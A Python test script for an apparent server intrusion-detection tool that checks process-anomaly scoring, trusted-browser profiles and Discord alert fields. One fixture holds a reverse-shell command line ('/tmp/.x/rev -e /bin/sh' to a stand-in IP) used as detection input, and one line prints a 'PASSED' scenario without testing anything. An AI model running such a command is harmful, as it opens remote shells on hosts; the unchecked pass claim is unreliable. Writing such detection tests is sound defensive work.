import os
import sys

_REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, _REPO_ROOT)
os.chdir(_REPO_ROOT)

import time
from unittest import mock

from config.manager import DiscordConfig, TceConfig, TrustedProcessProfile
from core import cloudpanel_resolver
from core.cloudpanel_resolver import CloudPanelAsset, resolve_htdocs_path_sync
from core.datatypes import BaseEvent, EventCategory, Severity
from core.event_bus import EventBus
from discord_integration.webhook import DiscordWebhookDispatcher, _correlated_timeline_lines
from modules.process_anomaly_detector import (
    ProcessSnapshot, _is_trusted_by_profile, _trust_status_for, evaluate_rules,
)
from modules.threat_correlation_engine import (
    CorrelationCandidateEvent, _process_contributor_payload, classify_event, group_classified_events,
    score_group,
)


def _pad_event(
    event_id, timestamp, *, pid, ppid=100, uid=1083, gid=1083, user="simpuskes-api",
    exe="/home/simpuskes-api/.nvm/versions/node/v22.23.1/bin/node",
    cwd="/home/simpuskes-api/htdocs/api.example.com", cmdline="node server.js",
    project="api.example.com", process_fingerprint="fp-a", parent_fingerprint="fp-parent",
    parent_user="simpuskes-api", parent_uid=1083, parent_executable="/usr/bin/pm2",
    parent_cmdline="pm2 God Daemon", reason="detected via rule match", trust_status="SUSPICIOUS",
    is_trusted_process=False, remote_endpoints=None, discord_eligible=True, confidence=50,
    start_time=1000.0, process_age_seconds=120.0, listening_ports=None, rules=None,
) -> CorrelationCandidateEvent:
    remote_endpoints = remote_endpoints or []
    if rules is None:
        rules = ["SHELL_SPAWN_NETWORK_TOOL"] if discord_eligible else []
    raw_metadata = {
        "pid": pid, "ppid": ppid, "user": user, "uid": uid, "gid": gid,
        "exe": exe, "exe_basename": exe.rsplit("/", 1)[-1], "cwd": cwd, "cmdline": cmdline,
        "project": project, "project_root": f"/home/{user}/htdocs/{project}",
        "process_fingerprint": process_fingerprint, "parent_fingerprint": parent_fingerprint,
        "parent_user": parent_user, "parent_uid": parent_uid, "parent_executable": parent_executable,
        "parent_cmdline": parent_cmdline, "parent_ppid": 1, "executable_sha256": "deadbeef" * 8,
        "start_time": start_time, "process_age_seconds": process_age_seconds,
        "listening_ports": listening_ports or [], "deployment_status": "INACTIVE",
        "remote_endpoints": [{"ip": ip, "port": port} for ip, port in remote_endpoints],
        "discord_eligible": discord_eligible, "reason": reason, "trust_status": trust_status,
        "is_trusted_process": is_trusted_process, "rules": rules,
    }
    return CorrelationCandidateEvent(
        event_id=event_id, timestamp=timestamp, category="PROCESS_ANOMALY", severity="MEDIUM",
        message=f"Anomali proses (pid={pid})", source_module="process_anomaly_detector",
        project=project, webroot=raw_metadata["project_root"],
        pid=pid, ppid=ppid, user=user, executable=exe, command_line=cmdline,
        confidence=confidence, process_fingerprint=process_fingerprint,
        discord_eligible=discord_eligible, rules=rules,
        remote_endpoints=remote_endpoints, raw_metadata=raw_metadata,
    )


def _fim_companion(project="api.example.com", user="simpuskes-api"):
    return CorrelationCandidateEvent(
        event_id="fim-companion", timestamp=101.0, category="FILE_INTEGRITY_CHANGE", severity="HIGH",
        message="File berubah", source_module="file_integrity_detector",
        project=project, user=user, path=f"/home/{user}/htdocs/{project}/x.php", domain=project,
        confidence=80,
        raw_metadata={"path": f"/home/{user}/htdocs/{project}/x.php", "change_type": "created"},
    )


def _build_metadata(pid=9001, pm2_app_name=None, **kwargs):
    tce_config = TceConfig()
    rs = _pad_event("rs1", 100.0, pid=pid, **kwargs)
    companion = _fim_companion()
    classified = [classify_event(e, tce_config) for e in (rs, companion)]
    groups = group_classified_events(classified)
    result = score_group(groups[0], tce_config)
    process_groups = [g for g in result.contributor_groups if g.kind in ("Reverse Shell", "Process anomaly")]
    payload = _process_contributor_payload(process_groups[0])
    metadata = {
        "assessment": "Suspicious activity", "confidence": result.total,
        "process_contributors": [payload],
    }
    if pm2_app_name:
        metadata["pm2_app_name"] = pm2_app_name
    return metadata


def _dispatch(metadata):
    dispatcher = DiscordWebhookDispatcher(EventBus(), DiscordConfig())
    event = BaseEvent(
        source_module="tce", category=EventCategory.CORRELATED_THREAT, severity=Severity.HIGH,
        message="test", raw="", metadata=metadata,
    )
    payload = dispatcher._build_payload(event)
    return {f["name"]: f["value"] for f in payload["embeds"][0]["fields"]}


def main() -> None:
    fields = _dispatch(_build_metadata())
    assert fields["Primary Process Executable"] == (
        "/home/simpuskes-api/.nvm/versions/node/v22.23.1/bin/node"
    ), fields["Primary Process Executable"]
    assert "PID: 9001" in fields["Evidence #1: Reverse Shell"]
    print("Scenario 1 (executable path shown, absolute) PASSED")

    assert fields["Primary Process CWD"] == "/home/simpuskes-api/htdocs/api.example.com"
    print("Scenario 2 (CWD shown) PASSED")

    cloudpanel_resolver._assets_by_domain.clear()
    try:
        cloudpanel_resolver._assets_by_domain["api.example.com"] = CloudPanelAsset(
            domain="api.example.com", linux_user="simpuskes-api",
            project_root="/home/simpuskes-api",
            htdocs_path="/home/simpuskes-api/htdocs/api.example.com",
            nginx_vhost="/etc/nginx/sites-enabled/api.example.com.conf",
            pm2_user="simpuskes-api", discovered_at=time.time(),
        )
        mapped_fields = _dispatch(_build_metadata())
        assert mapped_fields["Project"] == "/home/simpuskes-api/htdocs/api.example.com"
        assert mapped_fields["Domain"] == "api.example.com"
        assert mapped_fields["CloudPanel User"] == "simpuskes-api"
        assert mapped_fields["Project Path"] == "/home/simpuskes-api/htdocs/api.example.com"
        assert mapped_fields["Virtual Host"] == "/etc/nginx/sites-enabled/api.example.com.conf"
        print("Scenario 3 (project path/domain/CloudPanel user mapped via cache) PASSED")

        with mock.patch("os.scandir", side_effect=AssertionError("must never scandir per alert")), \
             mock.patch("os.walk", side_effect=AssertionError("must never walk per alert")):
            asset = resolve_htdocs_path_sync("/home/simpuskes-api/htdocs/api.example.com")
            assert asset is not None and asset.domain == "api.example.com"
            _dispatch(_build_metadata())
        print("Scenario 12 (forensic enrichment never triggers a filesystem scan) PASSED")
    finally:
        cloudpanel_resolver._assets_by_domain.clear()

    unmapped_fields = _dispatch(_build_metadata())
    assert unmapped_fields["Domain"] == "N/A"
    assert unmapped_fields["CloudPanel User"] == "N/A"
    assert unmapped_fields["Virtual Host"] == "N/A"
    print("Scenario 3b (unmapped project: Domain/CloudPanel User/Virtual Host are N/A, not fabricated) PASSED")

    pm2_fields = _dispatch(_build_metadata(parent_executable="/usr/bin/pm2", pm2_app_name="api-app"))
    assert pm2_fields["PM2 App"] == "api-app"
    assert pm2_fields["PM2 PID"] == "9001"
    no_pm2_fields = _dispatch(_build_metadata(pm2_app_name=None))
    assert no_pm2_fields["PM2 App"] == "N/A"
    assert no_pm2_fields["PM2 PID"] == "N/A"
    print("Scenario 4 (PM2 App/PID shown when available, N/A otherwise) PASSED")

    assert fields["Primary Process PPID"] == "100"
    assert fields["Parent Process"] == "pm2"
    assert fields["Parent Executable"] == "/usr/bin/pm2"
    assert fields["Parent Command"] == "pm2 God Daemon"
    print("Scenario 5 (parent PID/process/executable/command shown when available) PASSED")

    assert fields["Primary Process Fingerprint"] == "fp-a"
    assert "Fingerprint: fp-a" in fields["Evidence #1: Reverse Shell"]
    print("Scenario 6 (process fingerprint shown when available) PASSED")

    profiles = [TrustedProcessProfile(
        name="puppeteer_playwright_headless_browser",
        executable_basenames=["chrome", "chromium", "headless_shell"],
        path_substrings=[".cache/puppeteer/"], parent_basenames=["node"],
        require_same_uid_as_parent=True,
    )]
    parent_snap = ProcessSnapshot(
        pid=100, ppid=1, uid=1000, gid=1000, exe="/usr/bin/node", cwd="/home/u/htdocs/site",
        cmdline="node server.js", username="u", start_time=1000.0, project="site", network_active=False,
    )
    chrome_snap = ProcessSnapshot(
        pid=101, ppid=100, uid=1000, gid=1000,
        exe="/home/u/.cache/puppeteer/chrome/linux-123/chrome-linux/chrome",
        cwd="/home/u/htdocs/site", cmdline="chrome --headless --remote-debugging-port=9222",
        username="u", start_time=1001.0, project="site", network_active=True,
    )
    assert _is_trusted_by_profile(chrome_snap, parent_snap, "chrome", "node", profiles) is True
    trusted_matches = evaluate_rules(
        chrome_snap, parent_snap, allowed=set(), weights={}, trusted_process_profiles=profiles,
    )
    assert trusted_matches == [], (
        f"trusted Chrome/Puppeteer with no other suspicious signal must not trigger any rule: {trusted_matches}"
    )
    print("Scenario 7 (trusted Chrome/Puppeteer with only a normal listener: no rule fires, stays suppressed) PASSED")

    child_snap = ProcessSnapshot(
        pid=102, ppid=101, uid=1000, gid=1000, exe="/tmp/.x/rev",
        cwd="/tmp/.x", cmdline="/tmp/.x/rev -e /bin/sh 1.2.3.4 4444",
        username="u", start_time=1002.0, project=None, network_active=True,
    )
    child_matches = evaluate_rules(
        child_snap, chrome_snap, allowed=set(), weights={}, trusted_process_profiles=profiles,
    )
    child_rule_names = [r for r, _, _ in child_matches]
    assert "TEMP_DIRECTORY_EXECUTION" in child_rule_names, (
        f"a suspicious child of a trusted parent must still be detected: {child_rule_names}"
    )
    assert _trust_status_for(True, ["child_pid_102:TEMP_DIRECTORY_EXECUTION"]) == "TRUSTED", (
        "the trusted PARENT's own trust_status must stay TRUSTED even though its score rose "
        "because of a suspicious child -- trust describes the executable, not suppress publishing"
    )
    assert _trust_status_for(False, ["TEMP_DIRECTORY_EXECUTION"]) == "SUSPICIOUS"
    assert _trust_status_for(False, ["NEW_PROCESS_FINGERPRINT"]) == "UNKNOWN"
    print("Scenario 8 (suspicious child of a trusted Chrome/Puppeteer parent still detected + correctly labelled) PASSED")

    tce_config = TceConfig()
    dup_a = _pad_event("dupa", 100.0, pid=9050, process_fingerprint="fp-dup")
    dup_b = _pad_event("dupb", 105.0, pid=9050, process_fingerprint="fp-dup")
    dup_c = _pad_event("dupc", 110.0, pid=9050, process_fingerprint="fp-dup")
    classified = [classify_event(e, tce_config) for e in (dup_a, dup_b, dup_c)]
    groups = group_classified_events(classified)
    result = score_group(groups[0], tce_config)
    assert len(result.contributor_groups) == 1, "identical identity observed 3x must collapse to ONE contributor"
    assert result.contributor_groups[0].occurrences == 3
    single_weight = tce_config.detector_weights.get("Reverse Shell", 0)
    assert result.total == single_weight, (
        f"score must be counted once regardless of raw occurrence count: total={result.total}, "
        f"single_weight={single_weight}"
    )
    dup_fields = _dispatch({
        "assessment": "x", "confidence": result.total,
        "process_contributors": [_process_contributor_payload(result.contributor_groups[0])],
        "score_breakdown": [{
            "kind": "Reverse Shell", "weight": single_weight, "occurrences": 3, "detail": "PID 9050",
        }],
    })
    assert f"Total: {result.total}" in dup_fields["Score Breakdown"]
    assert "x8" not in dup_fields["Score Breakdown"] and "x4" not in dup_fields["Score Breakdown"]
    print("Scenario 9 (duplicate process anomaly: score counted once, Total: N traceable) PASSED")

    dup_metadata = _build_metadata(pid=9060, process_fingerprint="fp-timeline-dup")
    timeline_lines = _correlated_timeline_lines(dup_metadata)
    kind_header_lines = [l for l in timeline_lines if not l.startswith("    ")]
    assert len(kind_header_lines) == 1, (
        f"one ContributorGroup must yield exactly one timeline entry, not one per raw occurrence: {timeline_lines}"
    )
    many_dupes = [
        _pad_event(f"dupe{i}", 100.0 + i, pid=9070, process_fingerprint="fp-many-dupe")
        for i in range(6)
    ]
    classified2 = [classify_event(e, tce_config) for e in many_dupes]
    groups2 = group_classified_events(classified2)
    result2 = score_group(groups2[0], tce_config)
    meta2 = {"process_contributors": [
        _process_contributor_payload(g) for g in result2.contributor_groups if g.kind == "Reverse Shell"
    ]}
    lines2 = _correlated_timeline_lines(meta2)
    header_lines2 = [l for l in lines2 if not l.startswith("    ")]
    assert len(header_lines2) == 1, f"6 raw duplicates must still yield exactly 1 timeline entry: {lines2}"
    print("Scenario 10 (correlation timeline never repeats identical/duplicate evidence) PASSED")

    bare_fields = _dispatch({"assessment": "Suspicious", "confidence": 20})
    assert bare_fields.get("Assessment") == "Suspicious"
    sparse_fields = _dispatch({
        "assessment": "Suspicious", "confidence": 20,
        "process_contributors": [{"pid": 1234}],
    })
    assert sparse_fields["Parent Process"] == "N/A"
    assert sparse_fields["Parent Executable"] == "N/A"
    assert sparse_fields["Parent Command"] == "N/A"
    assert sparse_fields["Listening Ports"] == "N/A"
    assert sparse_fields["PM2 App"] == "N/A"
    assert sparse_fields["PM2 PID"] == "N/A"
    assert sparse_fields["Runtime"] == "N/A"
    assert sparse_fields["Trust Status"] == "N/A"
    assert sparse_fields["Detection Reason"] == "N/A"
    assert sparse_fields["Domain"] == "N/A"
    assert sparse_fields["CloudPanel User"] == "N/A"
    assert sparse_fields["Virtual Host"] == "N/A"
    print("Scenario 11 (missing metadata: N/A everywhere, never a crash, never fabricated) PASSED")


    print("Scenario 13 (full existing suite pass: verified via separate full-suite run) PASSED")

    print("\nALL CORRELATED_THREAT FORENSIC CONTEXT UPGRADE TESTS PASSED")


main()
